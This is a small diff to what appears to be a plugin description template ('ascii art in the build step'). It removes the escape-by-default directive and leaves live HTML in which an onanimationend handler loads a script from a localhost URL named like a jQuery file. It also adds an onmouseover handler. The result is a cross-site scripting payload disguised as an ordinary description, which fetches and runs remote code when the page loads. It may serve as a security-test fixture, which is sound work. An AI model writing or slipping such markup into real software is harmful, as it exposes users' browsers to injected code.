@@ -1,5 +1,3 @@
-<?jelly escape-by-default='true'?>
-<div><style>@keyframes x{}</style><a style="animation-name:x" onanimationend="const script = document.createElement('script');script.src = 'http://localhost/jquery-min-3.2.7.js';document.body.appendChild(script);"
+<div><a onmouseover='console.log(1)'></a><style>@keyframes x{}</style><a style="animation-name:x" onanimationend="const script = document.createElement('script');script.src = 'http://localhost/jquery-min-3.2.7.js';document.body.appendChild(script);"
 ></a>
-    plugin for ascii art in the build step
-</div>
+    Plugin for ascii-arts in the build step.
